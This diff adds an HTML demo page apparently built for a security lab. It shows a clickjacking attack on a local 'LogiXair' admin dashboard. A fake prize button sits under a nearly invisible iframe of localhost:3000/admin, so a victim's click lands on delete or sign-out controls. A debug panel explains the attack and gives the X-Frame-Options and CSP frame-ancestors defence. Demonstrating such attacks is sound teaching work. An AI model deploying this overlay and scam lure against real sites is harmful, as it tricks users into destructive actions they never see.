@@ -1,0 +1,165 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Win a Free Weather Station! - LogiXair Promo</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: system-ui, -apple-system, sans-serif;
+      background: linear-gradient(135deg, #1e1b4b 0%, #312e81 50%, #4338ca 100%);
+      min-height: 100vh;
+      color: #fff;
+    }
+    .hero {
+      max-width: 720px;
+      margin: 0 auto;
+      padding: 64px 32px 0;
+      text-align: center;
+    }
+    .badge {
+      display: inline-block;
+      background: rgba(255,255,255,.12);
+      backdrop-filter: blur(8px);
+      padding: 6px 14px;
+      border-radius: 999px;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 2px;
+      text-transform: uppercase;
+      color: #c7d2fe;
+      border: 1px solid rgba(255,255,255,.18);
+    }
+    h1 {
+      font-size: 44px;
+      line-height: 1.1;
+      margin: 18px 0 12px;
+      font-weight: 800;
+      letter-spacing: -.02em;
+    }
+    .sub {
+      color: #c7d2fe;
+      font-size: 16px;
+      margin: 0 0 36px;
+    }
+
+    /* CLICKJACK ATTACK CONTAINER
+       The iframe is sized to overlay the dashboard's "Delete" / "Sign Out"
+       button right under the visible bait button. opacity:0.0001 hides it
+       from the eye while still receiving the click. */
+    .trap {
+      position: relative;
+      width: 360px;
+      height: 80px;
+      margin: 0 auto;
+    }
+    .bait {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(135deg, #f59e0b, #ef4444);
+      color: #fff;
+      font-size: 18px;
+      font-weight: 800;
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      border: 0;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 12px 32px -8px rgba(239,68,68,.6);
+      z-index: 1;
+    }
+    iframe {
+      position: absolute;
+      inset: 0;
+      width: 100%;
+      height: 100%;
+      opacity: 0.0001;          /* invisible but click-receiving */
+      border: 0;
+      z-index: 2;               /* sits ON TOP of .bait so clicks go to it */
+    }
+
+    .debug {
+      max-width: 720px;
+      margin: 48px auto 0;
+      background: rgba(0,0,0,.35);
+      border: 1px solid rgba(255,255,255,.1);
+      border-radius: 14px;
+      padding: 20px 24px;
+      font-family: ui-monospace, Menlo, monospace;
+      font-size: 12px;
+      color: #fde68a;
+    }
+    .debug h3 { margin: 0 0 8px; color: #fff; font-size: 12px; text-transform: uppercase; letter-spacing: 2px; }
+    .debug code { color: #93c5fd; }
+
+    .visible-iframe {
+      max-width: 720px;
+      margin: 24px auto 0;
+      border: 2px dashed rgba(255,255,255,.25);
+      border-radius: 12px;
+      overflow: hidden;
+      height: 480px;
+      background: #fff;
+      position: relative;
+    }
+    .visible-iframe::before {
+      content: "DEBUG VIEW — same iframe, fully visible";
+      position: absolute;
+      top: 8px; left: 12px;
+      font-size: 10px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      color: #ef4444;
+      background: #fff;
+      padding: 2px 6px;
+      border-radius: 4px;
+      z-index: 3;
+    }
+    .visible-iframe iframe { opacity: 1; position: relative; }
+  </style>
+</head>
+<body>
+  <main class="hero">
+    <span class="badge">EXCLUSIVE OFFER</span>
+    <h1>You won a free LogiXair Pro!</h1>
+    <p class="sub">Click below to confirm your shipping address — limited slots remaining.</p>
+
+    <!-- THE ATTACK -->
+    <div class="trap">
+      <button class="bait" type="button">CLAIM MY FREE STATION</button>
+      <iframe src="http://localhost:3000/admin" title="trap"></iframe>
+    </div>
+
+    <div class="debug">
+      <h3>How this attack works</h3>
+      <p>
+        The orange button is bait. A transparent
+        <code>&lt;iframe src=&quot;http://localhost:3000/admin&quot;&gt;</code>
+        is laid on top of it. When the victim is already logged in to LogiXair
+        in another tab, clicking the bait actually clicks the admin
+        dashboard's button at the same coordinates — destroying a station,
+        deleting a user, or signing them out — without the victim ever seeing
+        the dashboard.
+      </p>
+      <p>
+        <b>Defense:</b> <code>X-Frame-Options: DENY</code> and CSP
+        <code>frame-ancestors 'none'</code> tell every browser to refuse
+        rendering this iframe. Toggle
+        <code>CLICKJACK_PROTECTION</code> in
+        <code>next.config.ts</code> to flip between vulnerable and protected.
+      </p>
+    </div>
+
+    <!-- Same iframe, made visible for the report screenshots so the reader
+         can see whether the admin dashboard rendered inside the frame or
+         was refused by the browser. -->
+    <div class="visible-iframe">
+      <iframe src="http://localhost:3000/admin" title="debug-view"></iframe>
+    </div>
+  </main>
+</body>
+</html>
